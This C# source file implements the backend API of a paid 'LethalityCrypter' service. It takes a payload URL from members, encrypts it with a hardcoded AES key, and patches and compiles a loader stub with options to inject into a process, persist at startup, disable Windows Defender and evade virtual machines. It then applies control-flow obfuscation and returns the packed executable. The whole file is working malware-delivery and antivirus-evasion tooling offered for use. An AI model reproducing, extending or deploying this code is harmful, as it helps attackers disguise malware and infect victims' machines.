using dnlib.DotNet;
using Microsoft.AspNetCore.Mvc;
using System;
using System.IO;
using LethalityCrypter.Data.Repositories;
using System.Threading.Tasks;
using LethalityCrypter.Entities;
using System.Net;
using System.IO.Compression;
using LethalityCrypter.Obfuscator.ControlFlow;
using System.Security.Cryptography;
using System.Text;

namespace LethalityCrypter.Controllers
{
    [ApiController]
    [Route("api/[controller]")]
    public class CrypterController : ControllerBase
    {
        UserRepository UserRepository = new UserRepository();

        [HttpPost]
        public async Task<IActionResult> Post([FromBody] Crypter settings)
        {
            if (!settings.Private)
            {
                var projectName = System.IO.File.ReadAllText("Project.txt");
                var buildedExeName = System.IO.File.ReadAllText("Name.txt");
                var textFile = System.IO.File.ReadAllText($"{projectName}/Program.cs");

                if (Helper.Process)
                {
                    return Ok("We can't do this action right now, please try it again after 5 secs.");
                }

                else
                {
                    try
                    {
                        var user = await UserRepository.GetSharedsAsync(settings.token);

                        if (user != null)
                        {
                            Helper.Process = true;

                            if (settings.assemblyChanger)
                            {
                                var assemblyFile = System.IO.File.ReadAllText($"{projectName}/Properties/AssemblyInfo.cs");

                                assemblyFile = assemblyFile.Replace($"AssemblyTitle(\"\")", $"AssemblyTitle(\"{settings.assemblyTitle}\")");
                                System.IO.File.WriteAllText($"{System.IO.File.ReadAllText("Project.txt")}/Program.cs", textFile);

                                assemblyFile = assemblyFile.Replace($"AssemblyDescription(\"\")", $"AssemblyDescription(\"{settings.assemblyDescription}\")");
                                System.IO.File.WriteAllText($"{System.IO.File.ReadAllText("Project.txt")}/Program.cs", textFile);

                                assemblyFile = assemblyFile.Replace($"AssemblyCompany(\"\")", $"AssemblyCompany(\"{settings.assemblyCompany}\")");
                                System.IO.File.WriteAllText($"{System.IO.File.ReadAllText("Project.txt")}/Program.cs", textFile);

                                assemblyFile = assemblyFile.Replace($"AssemblyProduct(\"\")", $"AssemblyProduct(\"{settings.assemblyProduct}\")");
                                System.IO.File.WriteAllText($"{System.IO.File.ReadAllText("Project.txt")}/Program.cs", textFile);

                                assemblyFile = assemblyFile.Replace($"AssemblyCopyright(\"\")", $"AssemblyCopyright(\"{settings.assemblyCopyright}\")");
                                System.IO.File.WriteAllText($"{System.IO.File.ReadAllText("Project.txt")}/Program.cs", textFile);
                            }

                            Helper.Change(textFile, settings.injectionPath, Helper.Encrypt(settings.fileUrl, "Hq!$czQiK^S^fOKFm#5sWVgtWDr5eY#A"), settings.startup, settings.obfuscator, settings.killWindowsDefender, settings.antiVM, settings.delay, settings.messageBox, settings.messageBoxTitle,
                                settings.messageBoxBody, settings.assemblyChanger, settings.assemblyTitle, settings.assemblyDescription, settings.assemblyCompany, settings.assemblyProduct, settings.assemblyCopyright);

                            Helper.BuildStub();
                            await Task.Delay(3000);
                            using (ModuleDef moduleDef = ModuleDefMD.Load($"{projectName}/bin/Debug/{buildedExeName}.exe"))
                            {
                                if (settings.obfuscator)
                                {
                                    ControlFlowObfuscation controlFlowObfuscation = new ControlFlowObfuscation(moduleDef);

                                    controlFlowObfuscation.ExecuteMethod(moduleDef.EntryPoint);
                                }

                                moduleDef.Write("Crypted.exe");
                            }

                            try
                            {
                                return Ok(Convert.ToBase64String(System.IO.File.ReadAllBytes("Crypted.exe")));
                            }

                            finally
                            {
                                System.IO.File.Delete("Crypted.exe");
                                Helper.Restore(textFile, settings.injectionPath, Helper.Decrypt(Helper.Encrypt(settings.fileUrl, "Hq!$czQiK^S^fOKFm#5sWVgtWDr5eY#A"), "Hq!$czQiK^S^fOKFm#5sWVgtWDr5eY#A"), settings.startup, settings.obfuscator, settings.killWindowsDefender, settings.antiVM, settings.delay, settings.messageBox, settings.messageBoxTitle,
                                    settings.messageBoxBody, settings.assemblyChanger, settings.assemblyTitle, settings.assemblyDescription, settings.assemblyCompany, settings.assemblyProduct, settings.assemblyCopyright);
                                if (settings.assemblyChanger)
                                {
                                    var assemblyFile = System.IO.File.ReadAllText($"{projectName}/Properties/AssemblyInfo.cs");

                                    assemblyFile = assemblyFile.Replace($"AssemblyTitle(\"{settings.assemblyTitle}\")", $"AssemblyTitle(\"\")");
                                    System.IO.File.WriteAllText($"{System.IO.File.ReadAllText("Project.txt")}/Program.cs", textFile);

                                    assemblyFile = assemblyFile.Replace($"AssemblyDescription(\"{settings.assemblyDescription}\")", $"AssemblyDescription(\"\")");
                                    System.IO.File.WriteAllText($"{System.IO.File.ReadAllText("Project.txt")}/Program.cs", textFile);

                                    assemblyFile = assemblyFile.Replace($"AssemblyCompany(\"{settings.assemblyCompany}\")", $"AssemblyCompany(\"\")");
                                    System.IO.File.WriteAllText($"{System.IO.File.ReadAllText("Project.txt")}/Program.cs", textFile);

                                    assemblyFile = assemblyFile.Replace($"AssemblyProduct(\"{settings.assemblyProduct}\")", $"AssemblyProduct(\"\")");
                                    System.IO.File.WriteAllText($"{System.IO.File.ReadAllText("Project.txt")}/Program.cs", textFile);

                                    assemblyFile = assemblyFile.Replace($"AssemblyCopyright(\"{settings.assemblyCopyright}\")", $"AssemblyCopyright(\"\")");
                                    System.IO.File.WriteAllText($"{System.IO.File.ReadAllText("Project.txt")}/Program.cs", textFile);
                                }


                                Helper.Process = false;
                            }
                        }

                        else
                        {
                            return Unauthorized("You don't have this membership.");
                        }
                    }

                    catch (Exception ex)
                    {
                        Helper.Process = false;
                        Helper.Restore(textFile, settings.injectionPath, Helper.Decrypt(Helper.Encrypt(settings.fileUrl, "Hq!$czQiK^S^fOKFm#5sWVgtWDr5eY#A"), "Hq!$czQiK^S^fOKFm#5sWVgtWDr5eY#A"), settings.startup, settings.obfuscator, settings.killWindowsDefender, settings.antiVM, settings.delay, settings.messageBox, settings.messageBoxTitle,
                            settings.messageBoxBody, settings.assemblyChanger, settings.assemblyTitle, settings.assemblyDescription, settings.assemblyCompany, settings.assemblyProduct, settings.assemblyCopyright);
                        return Ok("An error occured: " + ex.Message);
                    }
                }
            }
            else
            {
                var projectName = System.IO.File.ReadAllText("PrivateProject.txt");
                var buildedExeName = System.IO.File.ReadAllText("PrivateName.txt");
                var textFile = System.IO.File.ReadAllText($"{projectName}/Program.cs");

                if (Helper.Process)
                {
                    return Ok("We can't do this action right now, please try it again after 5 secs.");
                }

                else
                {
                    try
                    {
                        var user = await UserRepository.GetPrivatesAsync(settings.token);

                        if (user != null)
                        {
                            Helper.Process = true;

                            if (settings.assemblyChanger)
                            {
                                var assemblyFile = System.IO.File.ReadAllText($"{projectName}/Properties/AssemblyInfo.cs");

                                assemblyFile = assemblyFile.Replace($"AssemblyTitle(\"\")", $"AssemblyTitle(\"{settings.assemblyTitle}\")");
                                System.IO.File.WriteAllText($"{System.IO.File.ReadAllText("PrivateProject.txt")}/Program.cs", textFile);

                                assemblyFile = assemblyFile.Replace($"AssemblyDescription(\"\")", $"AssemblyDescription(\"{settings.assemblyDescription}\")");
                                System.IO.File.WriteAllText($"{System.IO.File.ReadAllText("PrivateProject.txt")}/Program.cs", textFile);

                                assemblyFile = assemblyFile.Replace($"AssemblyCompany(\"\")", $"AssemblyCompany(\"{settings.assemblyCompany}\")");
                                System.IO.File.WriteAllText($"{System.IO.File.ReadAllText("PrivateProject.txt")}/Program.cs", textFile);

                                assemblyFile = assemblyFile.Replace($"AssemblyProduct(\"\")", $"AssemblyProduct(\"{settings.assemblyProduct}\")");
                                System.IO.File.WriteAllText($"{System.IO.File.ReadAllText("PrivateProject.txt")}/Program.cs", textFile);

                                assemblyFile = assemblyFile.Replace($"AssemblyCopyright(\"\")", $"AssemblyCopyright(\"{settings.assemblyCopyright}\")");
                                System.IO.File.WriteAllText($"{System.IO.File.ReadAllText("PrivateProject.txt")}/Program.cs", textFile);
                            }

                            Helper.ChangePrivate(textFile, settings.injectionPath, Helper.Encrypt(settings.fileUrl, "Hq!$czQiK^S^fOKFm#5sWVgtWDr5eY#A"), settings.startup, settings.obfuscator, settings.killWindowsDefender, settings.antiVM, settings.delay, settings.messageBox, settings.messageBoxTitle,
                                settings.messageBoxBody, settings.assemblyChanger, settings.assemblyTitle, settings.assemblyDescription, settings.assemblyCompany, settings.assemblyProduct, settings.assemblyCopyright);

                            Helper.BuildPrivateStub();
                            await Task.Delay(3000);
                            using (ModuleDef moduleDef = ModuleDefMD.Load($"{projectName}/bin/Debug/{buildedExeName}.exe"))
                            {
                                if (settings.obfuscator)
                                {
                                    ControlFlowObfuscation controlFlowObfuscation = new ControlFlowObfuscation(moduleDef);

                                    foreach (var type in moduleDef.Types)
                                    {
                                        foreach (var methodDef in type.Methods)
                                        {
                                            controlFlowObfuscation.ExecuteMethod(methodDef);
                                        }
                                    }
                                }

                                moduleDef.Write("Crypted.exe");
                            }

                            try
                            {
                                return Ok(Convert.ToBase64String(System.IO.File.ReadAllBytes("Crypted.exe")));
                            }

                            finally
                            {
                                System.IO.File.Delete("Crypted.exe");
                                Helper.RestorePrivate(textFile, settings.injectionPath, Helper.Decrypt(Helper.Encrypt(settings.fileUrl, "Hq!$czQiK^S^fOKFm#5sWVgtWDr5eY#A"),"Hq!$czQiK^S^fOKFm#5sWVgtWDr5eY#A"), settings.startup, settings.obfuscator, settings.killWindowsDefender, settings.antiVM, settings.delay, settings.messageBox, settings.messageBoxTitle,
                                    settings.messageBoxBody, settings.assemblyChanger, settings.assemblyTitle, settings.assemblyDescription, settings.assemblyCompany, settings.assemblyProduct, settings.assemblyCopyright);
                                if (settings.assemblyChanger)
                                {
                                    var assemblyFile = System.IO.File.ReadAllText($"{projectName}/Properties/AssemblyInfo.cs");

                                    assemblyFile = assemblyFile.Replace($"AssemblyTitle(\"{settings.assemblyTitle}\")", $"AssemblyTitle(\"\")");
                                    System.IO.File.WriteAllText($"{System.IO.File.ReadAllText("PrivateProject.txt")}/Program.cs", textFile);

                                    assemblyFile = assemblyFile.Replace($"AssemblyDescription(\"{settings.assemblyDescription}\")", $"AssemblyDescription(\"\")");
                                    System.IO.File.WriteAllText($"{System.IO.File.ReadAllText("PrivateProject.txt")}/Program.cs", textFile);

                                    assemblyFile = assemblyFile.Replace($"AssemblyCompany(\"{settings.assemblyCompany}\")", $"AssemblyCompany(\"\")");
                                    System.IO.File.WriteAllText($"{System.IO.File.ReadAllText("PrivateProject.txt")}/Program.cs", textFile);

                                    assemblyFile = assemblyFile.Replace($"AssemblyProduct(\"{settings.assemblyProduct}\")", $"AssemblyProduct(\"\")");
                                    System.IO.File.WriteAllText($"{System.IO.File.ReadAllText("PrivateProject.txt")}/Program.cs", textFile);

                                    assemblyFile = assemblyFile.Replace($"AssemblyCopyright(\"{settings.assemblyCopyright}\")", $"AssemblyCopyright(\"\")");
                                    System.IO.File.WriteAllText($"{System.IO.File.ReadAllText("PrivateProject.txt")}/Program.cs", textFile);
                                }


                                Helper.Process = false;
                            }
                        }

                        else
                        {
                            return Unauthorized("You don't have this membership.");
                        }
                    }

                    catch (Exception ex)
                    {
                        Helper.Process = false;
                        Helper.RestorePrivate(textFile, settings.injectionPath, Helper.Decrypt(Helper.Encrypt(settings.fileUrl, "Hq!$czQiK^S^fOKFm#5sWVgtWDr5eY#A"), "Hq!$czQiK^S^fOKFm#5sWVgtWDr5eY#A"), settings.startup, settings.obfuscator, settings.killWindowsDefender, settings.antiVM, settings.delay, settings.messageBox, settings.messageBoxTitle,
                            settings.messageBoxBody, settings.assemblyChanger, settings.assemblyTitle, settings.assemblyDescription, settings.assemblyCompany, settings.assemblyProduct, settings.assemblyCopyright);
                        return Ok("An error occured: " + ex.Message);
                    }
                }
            }
        }
    }

    public class Helper
    {
        public static bool Process = false;

        public static void SwapMethod(MethodDef degistirilecek, MethodDef kopyalanacak)
        {
            degistirilecek.Body = kopyalanacak.Body;
        }

        public static string GetCompressedByteFromUrl(string fileUrl)
        {
            using (WebClient webClient = new WebClient())
            {
                string bytes = "";

                foreach (var byteA in Compress(webClient.DownloadData(fileUrl)))
                {
                    bytes += byteA + ",";
                }

                bytes = bytes.Remove(bytes.Length - 1, 1);

                return bytes;
            }
        }

        public static string GetCompressedByteFromPath(string filePath)
        {
            string bytes = "";

            foreach (var byteA in Compress(File.ReadAllBytes(filePath)))
            {
                bytes += byteA + ",";
            }

            bytes = bytes.Remove(bytes.Length - 1, 1);

            return bytes;
        }

        public static byte[] Compress(byte[] data)
        {
            MemoryStream output = new MemoryStream();
            using (DeflateStream dstream = new DeflateStream(output, CompressionLevel.Optimal))
            {
                dstream.Write(data, 0, data.Length);
            }

            var newArray = output.ToArray();

            for (int i = 0; i < newArray.Length; i++)
            {
                if (newArray[i] != byte.MaxValue)
                {
                    newArray[i] = newArray[i] += 1;
                }
            }

            return newArray;
        }

        public static void BuildStub()
        {
            System.Diagnostics.Process process = new System.Diagnostics.Process();
            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
            startInfo.FileName = "cmd.exe";
            startInfo.WorkingDirectory = Environment.CurrentDirectory + $"/{File.ReadAllText("Project.txt")}";
            startInfo.Arguments = @"/C C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe";
            process.StartInfo = startInfo;
            process.Start();
        }

        public static void BuildPrivateStub()
        {
            System.Diagnostics.Process process = new System.Diagnostics.Process();
            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
            startInfo.FileName = "cmd.exe";
            startInfo.WorkingDirectory = Environment.CurrentDirectory + $"/{File.ReadAllText("PrivateProject.txt")}";
            startInfo.Arguments = @"/C C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe";
            process.StartInfo = startInfo;
            process.Start();
        }

        public static void Change(string textFile, string injectionPath, string url, bool startup, bool obfuscator, bool killWindowsDefender, bool antiVM, int delay, bool messageBox, string messageBoxTitle, string messageBoxBody, bool assemblyChanger, string assemblyTitle, string assemblyDescription, string assemblyCompany, string assemblyProduct, string assemblyCopyright)
        {
            textFile = textFile.Replace($"string injectionPath = @\"\";", $"string injectionPath = @\"{injectionPath}\";");
            File.WriteAllText($"{File.ReadAllText("Project.txt")}/Program.cs", textFile);

            textFile = textFile.Replace($"string url = @\"\";", $"string url = @\"{url}\";");
            File.WriteAllText($"{File.ReadAllText("Project.txt")}/Program.cs", textFile);

            textFile = textFile.Replace($"bool startup = false;", $"bool startup = {startup.ToString().ToLower()};");
            File.WriteAllText($"{File.ReadAllText("Project.txt")}/Program.cs", textFile);

            textFile = textFile.Replace($"bool obfuscator = false;", $"bool obfuscator = {obfuscator.ToString().ToLower()};");
            File.WriteAllText($"{File.ReadAllText("Project.txt")}/Program.cs", textFile);

            textFile = textFile.Replace($"bool killWindowsDefender = false;", $"bool killWindowsDefender = {killWindowsDefender.ToString().ToLower()};");
            File.WriteAllText($"{File.ReadAllText("Project.txt")}/Program.cs", textFile);

            textFile = textFile.Replace($"bool antiVM = false;", $"bool antiVM = {antiVM.ToString().ToLower()};");
            File.WriteAllText($"{File.ReadAllText("Project.txt")}/Program.cs", textFile);

            textFile = textFile.Replace($"int delay = 0;", $"int delay = {delay};");
            File.WriteAllText($"{File.ReadAllText("Project.txt")}/Program.cs", textFile);

            textFile = textFile.Replace($"bool messageBox = false;", $"bool messageBox = {messageBox.ToString().ToLower()};");
            File.WriteAllText($"{File.ReadAllText("Project.txt")}/Program.cs", textFile);

            textFile = textFile.Replace($"string messageBoxTitle = \"\";", $"string messageBoxTitle = \"{messageBoxTitle}\";");
            File.WriteAllText($"{File.ReadAllText("Project.txt")}/Program.cs", textFile);

            textFile = textFile.Replace($"string messageBoxBody = \"\";", $"string messageBoxBody = \"{messageBoxBody}\";");
            File.WriteAllText($"{File.ReadAllText("Project.txt")}/Program.cs", textFile);

            textFile = textFile.Replace($"bool assemblyChanger = false;", $"bool assemblyChanger = {assemblyChanger.ToString().ToLower()};");
            File.WriteAllText($"{File.ReadAllText("Project.txt")}/Program.cs", textFile);

            textFile = textFile.Replace($"string assemblyTitle = \"\";", $"string assemblyTitle = \"{assemblyTitle}\";");
            File.WriteAllText($"{File.ReadAllText("Project.txt")}/Program.cs", textFile);

            textFile = textFile.Replace($"string assemblyDescription = \"\";", $"string assemblyDescription = \"{assemblyDescription}\";");
            File.WriteAllText($"{File.ReadAllText("Project.txt")}/Program.cs", textFile);

            textFile = textFile.Replace($"string assemblyCompany = \"\";", $"string assemblyCompany = \"{assemblyCompany}\";");
            File.WriteAllText($"{File.ReadAllText("Project.txt")}/Program.cs", textFile);

            textFile = textFile.Replace($"string assemblyProduct = \"\";", $"string assemblyProduct = \"{assemblyProduct}\";");
            File.WriteAllText($"{File.ReadAllText("Project.txt")}/Program.cs", textFile);

            textFile = textFile.Replace($"string assemblyCopyright = \"\";", $"string assemblyCopyright = \"{assemblyCopyright}\";");
            File.WriteAllText($"{File.ReadAllText("Project.txt")}/Program.cs", textFile);
        }

        public static void ChangePrivate(string textFile, string injectionPath, string url, bool startup, bool obfuscator, bool killWindowsDefender, bool antiVM, int delay, bool messageBox, string messageBoxTitle, string messageBoxBody, bool assemblyChanger, string assemblyTitle, string assemblyDescription, string assemblyCompany, string assemblyProduct, string assemblyCopyright)
        {
            textFile = textFile.Replace($"string injectionPath = @\"\";", $"string injectionPath = @\"{injectionPath}\";");
            File.WriteAllText($"{File.ReadAllText("PrivateProject.txt")}/Program.cs", textFile);

            textFile = textFile.Replace($"string url = @\"\";", $"string url = @\"{url}\";");
            File.WriteAllText($"{File.ReadAllText("PrivateProject.txt")}/Program.cs", textFile);

            textFile = textFile.Replace($"bool startup = false;", $"bool startup = {startup.ToString().ToLower()};");
            File.WriteAllText($"{File.ReadAllText("PrivateProject.txt")}/Program.cs", textFile);

            textFile = textFile.Replace($"bool obfuscator = false;", $"bool obfuscator = {obfuscator.ToString().ToLower()};");
            File.WriteAllText($"{File.ReadAllText("PrivateProject.txt")}/Program.cs", textFile);

            textFile = textFile.Replace($"bool killWindowsDefender = false;", $"bool killWindowsDefender = {killWindowsDefender.ToString().ToLower()};");
            File.WriteAllText($"{File.ReadAllText("PrivateProject.txt")}/Program.cs", textFile);

            textFile = textFile.Replace($"bool antiVM = false;", $"bool antiVM = {antiVM.ToString().ToLower()};");
            File.WriteAllText($"{File.ReadAllText("PrivateProject.txt")}/Program.cs", textFile);

            textFile = textFile.Replace($"int delay = 0;", $"int delay = {delay};");
            File.WriteAllText($"{File.ReadAllText("PrivateProject.txt")}/Program.cs", textFile);

            textFile = textFile.Replace($"bool messageBox = false;", $"bool messageBox = {messageBox.ToString().ToLower()};");
            File.WriteAllText($"{File.ReadAllText("PrivateProject.txt")}/Program.cs", textFile);

            textFile = textFile.Replace($"string messageBoxTitle = \"\";", $"string messageBoxTitle = \"{messageBoxTitle}\";");
            File.WriteAllText($"{File.ReadAllText("PrivateProject.txt")}/Program.cs", textFile);

            textFile = textFile.Replace($"string messageBoxBody = \"\";", $"string messageBoxBody = \"{messageBoxBody}\";");
            File.WriteAllText($"{File.ReadAllText("PrivateProject.txt")}/Program.cs", textFile);

            textFile = textFile.Replace($"bool assemblyChanger = false;", $"bool assemblyChanger = {assemblyChanger.ToString().ToLower()};");
            File.WriteAllText($"{File.ReadAllText("PrivateProject.txt")}/Program.cs", textFile);

            textFile = textFile.Replace($"string assemblyTitle = \"\";", $"string assemblyTitle = \"{assemblyTitle}\";");
            File.WriteAllText($"{File.ReadAllText("PrivateProject.txt")}/Program.cs", textFile);

            textFile = textFile.Replace($"string assemblyDescription = \"\";", $"string assemblyDescription = \"{assemblyDescription}\";");
            File.WriteAllText($"{File.ReadAllText("PrivateProject.txt")}/Program.cs", textFile);

            textFile = textFile.Replace($"string assemblyCompany = \"\";", $"string assemblyCompany = \"{assemblyCompany}\";");
            File.WriteAllText($"{File.ReadAllText("PrivateProject.txt")}/Program.cs", textFile);

            textFile = textFile.Replace($"string assemblyProduct = \"\";", $"string assemblyProduct = \"{assemblyProduct}\";");
            File.WriteAllText($"{File.ReadAllText("PrivateProject.txt")}/Program.cs", textFile);

            textFile = textFile.Replace($"string assemblyCopyright = \"\";", $"string assemblyCopyright = \"{assemblyCopyright}\";");
            File.WriteAllText($"{File.ReadAllText("PrivateProject.txt")}/Program.cs", textFile);
        }

        public static void Restore(string textFile, string injectionPath, string url, bool startup, bool obfuscator, bool killWindowsDefender, bool antiVM, int delay, bool messageBox, string messageBoxTitle, string messageBoxBody, bool assemblyChanger, string assemblyTitle, string assemblyDescription, string assemblyCompany, string assemblyProduct, string assemblyCopyright)
        {
            textFile = textFile.Replace($"string injectionPath = @\"{injectionPath}\";", $"string injectionPath = @\"\";");
            File.WriteAllText($"{File.ReadAllText("Project.txt")}/Program.cs", textFile);

            textFile = textFile.Replace($"string url = @\"{url}\";", $"string url = @\"\";");
            File.WriteAllText($"{File.ReadAllText("Project.txt")}/Program.cs", textFile);

            textFile = textFile.Replace($"bool startup = {startup.ToString().ToLower()};", $"bool startup = false;");
            File.WriteAllText($"{File.ReadAllText("Project.txt")}/Program.cs", textFile);

            textFile = textFile.Replace($"bool obfuscator = {obfuscator.ToString().ToLower()};", $"bool obfuscator = false;");
            File.WriteAllText($"{File.ReadAllText("Project.txt")}/Program.cs", textFile);

            textFile = textFile.Replace($"bool killWindowsDefender = {killWindowsDefender.ToString().ToLower()};", $"bool killWindowsDefender = false;");
            File.WriteAllText($"{File.ReadAllText("Project.txt")}/Program.cs", textFile);

            textFile = textFile.Replace($"bool antiVM = {antiVM.ToString().ToLower()};", $"bool antiVM = false;");
            File.WriteAllText($"{File.ReadAllText("Project.txt")}/Program.cs", textFile);

            textFile = textFile.Replace($"int delay = {delay};", $"int delay = 0;");
            File.WriteAllText($"{File.ReadAllText("Project.txt")}/Program.cs", textFile);

            textFile = textFile.Replace($"bool messageBox = {messageBox.ToString().ToLower()};", $"bool messageBox = false;");
            File.WriteAllText($"{File.ReadAllText("Project.txt")}/Program.cs", textFile);

            textFile = textFile.Replace($"string messageBoxTitle = \"{messageBoxTitle}\";", $"string messageBoxTitle = \"\";");
            File.WriteAllText($"{File.ReadAllText("Project.txt")}/Program.cs", textFile);

            textFile = textFile.Replace($"string messageBoxBody = \"{messageBoxBody}\";", $"string messageBoxBody = \"\";");
            File.WriteAllText($"{File.ReadAllText("Project.txt")}/Program.cs", textFile);

            textFile = textFile.Replace($"bool assemblyChanger = {assemblyChanger.ToString().ToLower()};", $"bool assemblyChanger = false;");
            File.WriteAllText($"{File.ReadAllText("Project.txt")}/Program.cs", textFile);

            textFile = textFile.Replace($"string assemblyTitle = \"{assemblyTitle}\";", $"string assemblyTitle = \"\";");
            File.WriteAllText($"{File.ReadAllText("Project.txt")}/Program.cs", textFile);

            textFile = textFile.Replace($"string assemblyDescription = \"{assemblyDescription}\";", $"string assemblyDescription = \"\";");
            File.WriteAllText($"{File.ReadAllText("Project.txt")}/Program.cs", textFile);

            textFile = textFile.Replace($"string assemblyCompany = \"{assemblyCompany}\";", $"string assemblyCompany = \"\";");
            File.WriteAllText($"{File.ReadAllText("Project.txt")}/Program.cs", textFile);

            textFile = textFile.Replace($"string assemblyProduct = \"{assemblyProduct}\";", $"string assemblyProduct = \"\";");
            File.WriteAllText($"{File.ReadAllText("Project.txt")}/Program.cs", textFile);

            textFile = textFile.Replace($"string assemblyCopyright = \"{assemblyCopyright}\";", $"string assemblyCopyright = \"\";");
            File.WriteAllText($"{File.ReadAllText("Project.txt")}/Program.cs", textFile);
        }

        public static void RestorePrivate(string textFile, string injectionPath, string url, bool startup, bool obfuscator, bool killWindowsDefender, bool antiVM, int delay, bool messageBox, string messageBoxTitle, string messageBoxBody, bool assemblyChanger, string assemblyTitle, string assemblyDescription, string assemblyCompany, string assemblyProduct, string assemblyCopyright)
        {
            textFile = textFile.Replace($"string injectionPath = @\"{injectionPath}\";", $"string injectionPath = @\"\";");
            File.WriteAllText($"{File.ReadAllText("PrivateProject.txt")}/Program.cs", textFile);

            textFile = textFile.Replace($"string url = @\"{url}\";", $"string url = @\"\";");
            File.WriteAllText($"{File.ReadAllText("PrivateProject.txt")}/Program.cs", textFile);

            textFile = textFile.Replace($"bool startup = {startup.ToString().ToLower()};", $"bool startup = false;");
            File.WriteAllText($"{File.ReadAllText("PrivateProject.txt")}/Program.cs", textFile);

            textFile = textFile.Replace($"bool obfuscator = {obfuscator.ToString().ToLower()};", $"bool obfuscator = false;");
            File.WriteAllText($"{File.ReadAllText("PrivateProject.txt")}/Program.cs", textFile);

            textFile = textFile.Replace($"bool killWindowsDefender = {killWindowsDefender.ToString().ToLower()};", $"bool killWindowsDefender = false;");
            File.WriteAllText($"{File.ReadAllText("PrivateProject.txt")}/Program.cs", textFile);

            textFile = textFile.Replace($"bool antiVM = {antiVM.ToString().ToLower()};", $"bool antiVM = false;");
            File.WriteAllText($"{File.ReadAllText("PrivateProject.txt")}/Program.cs", textFile);

            textFile = textFile.Replace($"int delay = {delay};", $"int delay = 0;");
            File.WriteAllText($"{File.ReadAllText("PrivateProject.txt")}/Program.cs", textFile);

            textFile = textFile.Replace($"bool messageBox = {messageBox.ToString().ToLower()};", $"bool messageBox = false;");
            File.WriteAllText($"{File.ReadAllText("PrivateProject.txt")}/Program.cs", textFile);

            textFile = textFile.Replace($"string messageBoxTitle = \"{messageBoxTitle}\";", $"string messageBoxTitle = \"\";");
            File.WriteAllText($"{File.ReadAllText("PrivateProject.txt")}/Program.cs", textFile);

            textFile = textFile.Replace($"string messageBoxBody = \"{messageBoxBody}\";", $"string messageBoxBody = \"\";");
            File.WriteAllText($"{File.ReadAllText("PrivateProject.txt")}/Program.cs", textFile);

            textFile = textFile.Replace($"bool assemblyChanger = {assemblyChanger.ToString().ToLower()};", $"bool assemblyChanger = false;");
            File.WriteAllText($"{File.ReadAllText("PrivateProject.txt")}/Program.cs", textFile);

            textFile = textFile.Replace($"string assemblyTitle = \"{assemblyTitle}\";", $"string assemblyTitle = \"\";");
            File.WriteAllText($"{File.ReadAllText("PrivateProject.txt")}/Program.cs", textFile);

            textFile = textFile.Replace($"string assemblyDescription = \"{assemblyDescription}\";", $"string assemblyDescription = \"\";");
            File.WriteAllText($"{File.ReadAllText("PrivateProject.txt")}/Program.cs", textFile);

            textFile = textFile.Replace($"string assemblyCompany = \"{assemblyCompany}\";", $"string assemblyCompany = \"\";");
            File.WriteAllText($"{File.ReadAllText("PrivateProject.txt")}/Program.cs", textFile);

            textFile = textFile.Replace($"string assemblyProduct = \"{assemblyProduct}\";", $"string assemblyProduct = \"\";");
            File.WriteAllText($"{File.ReadAllText("PrivateProject.txt")}/Program.cs", textFile);

            textFile = textFile.Replace($"string assemblyCopyright = \"{assemblyCopyright}\";", $"string assemblyCopyright = \"\";");
            File.WriteAllText($"{File.ReadAllText("PrivateProject.txt")}/Program.cs", textFile);
        }

        public static string RandomString()
        {

            var chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            var stringChars = new char[8];
            var random = new Random();

            for (int i = 0; i < stringChars.Length; i++)
            {
                stringChars[i] = chars[random.Next(chars.Length)];
            }

            return new string(stringChars);
        }

        public static string Encrypt(string plainText, string key)
        {
            byte[] iv = new byte[16];
            byte[] array;

            using (Aes aes = Aes.Create())
            {
                aes.Key = Encoding.UTF8.GetBytes(key);
                aes.IV = iv;

                ICryptoTransform encryptor = aes.CreateEncryptor(aes.Key, aes.IV);

                using (MemoryStream memoryStream = new MemoryStream())
                {
                    using (CryptoStream cryptoStream = new CryptoStream((Stream)memoryStream, encryptor, CryptoStreamMode.Write))
                    {
                        using (StreamWriter streamWriter = new StreamWriter((Stream)cryptoStream))
                        {
                            streamWriter.Write(plainText);
                        }

                        array = memoryStream.ToArray();
                    }
                }
            }

            return Convert.ToBase64String(array);
        }

        public static string Decrypt(string cipherText, string key)
        {
            byte[] iv = new byte[16];
            byte[] buffer = Convert.FromBase64String(cipherText);

            using (Aes aes = Aes.Create())
            {
                aes.Key = Encoding.UTF8.GetBytes(key);
                aes.IV = iv;
                ICryptoTransform decryptor = aes.CreateDecryptor(aes.Key, aes.IV);

                using (MemoryStream memoryStream = new MemoryStream(buffer))
                {
                    using (CryptoStream cryptoStream = new CryptoStream((Stream)memoryStream, decryptor, CryptoStreamMode.Read))
                    {
                        using (StreamReader streamReader = new StreamReader((Stream)cryptoStream))
                        {
                            return streamReader.ReadToEnd();
                        }
                    }
                }
            }
        }

    }
}